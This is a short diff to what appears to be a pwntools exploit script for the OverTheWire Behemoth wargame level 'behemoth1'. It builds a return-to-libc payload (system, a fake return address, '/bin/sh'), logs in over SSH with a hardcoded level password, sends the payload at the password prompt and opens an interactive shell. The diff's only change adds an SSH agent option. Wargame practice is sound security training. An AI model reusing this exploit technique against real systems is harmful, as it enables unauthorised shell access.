@@ -10,7 +10,7 @@ payload += system
 payload += 'FAKE'
 payload += binsh
 
-shell = ssh('behemoth1', 'behemoth.labs.overthewire.org', password='aesebootiv', port=2221)
+shell = ssh('behemoth1', 'behemoth.labs.overthewire.org', password='aesebootiv', port=2221, ssh_agent=True)
 p = shell.run('/behemoth/behemoth1')
 p.sendlineafter('Password: ', payload)
 p.interactive()
